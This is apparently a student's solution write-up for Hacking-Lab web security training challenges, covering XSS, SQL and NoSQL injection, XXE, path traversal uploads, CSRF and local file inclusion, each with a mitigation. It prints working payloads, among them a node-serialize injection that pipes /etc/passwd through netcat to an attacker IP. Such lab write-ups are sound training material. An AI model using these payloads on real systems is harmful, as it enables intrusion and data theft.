# Hacking-Lab: Musterlösung

## Intro Challenge ZAP Proxy

**Questions:**   
1\) Which HTTP response code \(xxx\) is sent by the server in case of a successful authentication?   
2\) To which URL the user is being redirected, after a successful authentication?   
3\) which HTTP response code \(xxx\) is sent in case of a failed login?

**Answers:**   
1\) The HTTP response code for the Login POST-Requests is: 302   
2\) The Location parameter of the Response-Header is: [https://www.hacking-lab.com/events/](https://www.hacking-lab.com/events/)   
3\) The HTTP response code for the failed login POST-Requests is: 200

## 1601 LiveCD Intro Challenge: Landing Page Server

_**Questions:**_   
Tell us the linux commands to achieve the following results.

```text
start the LiveCD apache server
stop the LiveCD apache server
monitor the access_log
```

_**Answers:**_   
1\) As root we can start apache through the init.d script /etc/init.d/apache\_but with the argument start: /etc/init.d/apache\_but start   
2\) As root we can stop apache through the init.d script /etc/init.d/apache\_but with the argument stop: /etc/init.d/apache\_but stop   
3\) Access\_log is located at /opt/applic/httpd/logs and can be followed with the tail command with option -f \(follow\): tail -f /opt/applic/httpd/logs/access\_log

## 2101 Bypassing Authorization

_**Questions:**_  
****Please answer the following security questions in order to get full points for this challenge.

```text
Explain the security problem
Explain your attack. (exploit, screenshot, hacking journal)
Explain mitigation (remedy)
```

_**Answers**:_  
**Security Problem:**   
After a users login the bell shop sets a cookie "BCookie". In this Cookie we see some sort of unique key for the user / or session-id. The application is frame based and uses GET-Query-Paramter \(pid\) for selecting the profile on "My Account" page. The bell shop is not secure since it does not check whether the requested pid does belong to the user logged in user or he has rights to access it.

**Attack:**   
See screenshot, I can login is as User A, request information about another account User B by quessing/brute forcing the pids. Data can be stolen

**Mitigation:**   
The application should move away from the pid in the GET-Query-parameter to POST to fetch the account information. Also the applications endpoint should be improved to only give access to authorized users.

## 2300 Cross-Site Scripting Attack Guestbook

_**Questions:**_  
****Please answer the following security questions in order to get full points for this challenge.

```text
Explain the security problem
Explain your attack. (exploit, screenshot, hacking journal)
Explain mitigation (remedy)
```

_**Answers**:_

**Security Problem:**   
The problem is that on the comments of a product XSS is possible and stored in the database. So a hacker can enter a script tag which is stored in the database and does something. Since Cookie "BCookie" is httpOnly=false we're able to read the cookies data with Javascript and make a request to the hackers landing page \(with a image tag\)

**Attack type:**   
See screenshot, the cookie can be read in the access\_logs of the hackers landing page. He than can steal the identiy of the user.

**Mitigation:**

* Protect input on comments against XSS attacks \(strip HTML-Enties so  is not allowed anymore\)
* Set cookie "BCookie" to httpOnly so it can't be acces from Javascript anymore
* Set CSP with http headers to allow img sourcing only from trusted site \(self\)

![](../.gitbook/assets/image%20%2817%29.png)

{% embed url="https://www.owasp.org/index.php/Germany/Projekte/Top\_10\_fuer\_Entwickler-2013/A3-Cross-Site\_Scripting\_\(XSS\)" %}



## 2310-a Web Security: SQL-Injection with UNION

_**Questions:**_  
****Please answer the following security questions in order to get full points for this challenge.

```text
Explain the security problem
Explain your attack. (exploit, screenshot, hacking journal)
Explain mitigation (remedy)
```

_**Answers:**_

**Security Problem:**   
SQL-Injection is possible on the password-field on "My Account" page. The field is not

**Attack:**   
SQL-Injection / Exploit:

```text
' or 1=1 #
```

select \* from users where username = 'hacker33' and password = '' and locked = 0; If we now enter the code above instead of  the string ' or 1=1 \# is entered. Since we have an OR, the query will be true and continue with login. the \# \(hashtag\) at the end is also important to strip away everything after that.

**Mitigation:** 

## 2400 CowbellShop 1 NOSQL

_**Answers:**_  
**Securty Problem:**   
NOSQL-Injection possible on login form of bell shop  
  
**Attack:**   
SQL Injection / Exploit for login in without credentials

```text
username: {"$ne": null}
password: {"$ne": null}
```

=&gt; See screenshot

**Mitigation:**

* Applications Code needs to be improved \(data input validation\)
* Use of middleware \(for example: joi/celebrate if you use NodeJS\) 
* A proper setup of a WAF could block such requests

## 2406 CowbellShop 7 SERIAL

**Security Problem:**   
In a node application the users search input will most likely be converted to a object using node-serialization function.

**Attack:**   
Serialization / Send content of /etc/passwd over port 80 to the hacker by entering the following to the search field:

```text
_$$ND_FUNC$$_function (){require('child_process').exec('cat /etc/passwd |nc 10.201.1.118 80');}()
```

The hacker is able to see the content sent by the victim in his shell \(See screenshot\)

**Mitigation**

* Secure application / secure programming \(data input validation\)
* Patch framework and/or use middleware to validate user-input
* WAF-Setup could help 

## 2503 PLUpload Challenge

**Security Problem:**   
The fileupload script is running on a linux/unix like webserver with a tree-based directory structure. The folder which the uploaded files will be placed is not secure enough

**Attack:**   
Uploaded shell3.jsp with the uploaded but intercepted the request with ZAP, changed the filename to ../shell3.jsp. Two dots with slash \(../\) in linux/unix environments means one directory up. So the script is uploaded to an public directory where we can execute it. Then used Firefox to access the script, which ran and we're able to navigate to /var/gold.txt.

See screenshot

**Mitigation:**

* Hardending/Securing the PLUpload script/application
* Secure the webserver
* Use of Sandbox \(so the uploaded files are seperate and not close in the tree to execute\)

## 2600 Web Security: XML Path Traversal

**Security Problem:**   
Same as before, the problem is the tree structure of a linuxed based operating systems and the possibility \(here xml\) to search for specific files and their content.

**Attack:**   
Step by step search through the tree for files until we find something more intersting as credentials for users and database. Used ZAP to replay the search and ended up with the following query:

```text
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE query [ <!ENTITY value SYSTEM "/opt/applic/tomcat/webapps.properties/mysql.properties"> ]>
<query>
  <bell-name>&value;</bell-name>
  <bell-description></bell-description>
</query>
```

==&gt; Found mysql.properties file, content see attachment

**Mitigation:**

* Secure Coding \(input validation\)
* Protect webserver \(patch, sandbox\)
* possible usage of WAF

## 2651 Web Security: Cross Site Request Forgery

**Explain the attack:**   
The hacker has provided the victim a simple html website with two -Tags on it. The images are both 1x1 pixels, so basically not visible. The src attribute is where the real attack is, first images adds products to the shopping card, the second image executes the order. Since the user is still logged in with his cookie, both images are render by the browser and the order is placed.

**Mitigation:**

* Cookie of bell applications needs to be changed to SameSite=Strict or SameSite=Lax
* Verifying origin with standard headers
* Set a custom header \(for example: X-XSRF-TOKEN\)
* Use a unique, unpredictable token on every form and session which is validated by the server
* Use WAF

Why is a java script from the attacker host not able to do the job \(read the xsrf token and post the transaction\)?

* Because the cookie might be HttpOnly=true and therefore not readable by javascript
* there might be an XSS protection, so JS cant be run 

![](../.gitbook/assets/image%20%282%29.png)

{% embed url="https://www.owasp.org/index.php/Germany/Projekte/Top\_10\_fuer\_Entwickler-2013/A8-Cross-Site\_Request\_Forgery\_\(CSRF\)" %}

## 2667 Web Security: Failure to restrict url access

**Security Problem:**   
The list of all transactions is not restricted to the admin users only.

**Attack**:

* Data leakage, information and credit card details can be stolen

**Mitigation**:

* secure programming \(protect routes/urls for admin only\)
* use WAF, for example an ip-filter to restrict access

## 2803 Local File Inclusions

**Security Problem:**   
Linux/Unix file system with tree based directories. The PHP script is not protected and/or sandboxed.

**Attack:**   
Called url:

`weather.hacking-lab.com/weathermap/editor.php?action=show_config&mapname=../../opt/secret.txt`

See screenshot for evidence

**Mitigation**:   
-secure programming -securing/configuring the applications webserver

## 2711 XSS mitigation of PHP chat web app

**Fix:**   
See attached screenshot

Explained: On the chat both GET or POST are rendered with PHP. If a user enters javascript \(for example an alert\(\)\) the  tags are injected straight to the DOM which will be executed, so the alert-box will be displayed. If we use the htmlentities function \([https://www.php.net/manual/de/function.htmlentities.php](https://www.php.net/manual/de/function.htmlentities.php)\) all applicable characters are converted to HTML entities, the function returns an encoded string [https://www.php.net/manual/de/function.htmlentities.php](https://www.php.net/manual/de/function.htmlentities.php)

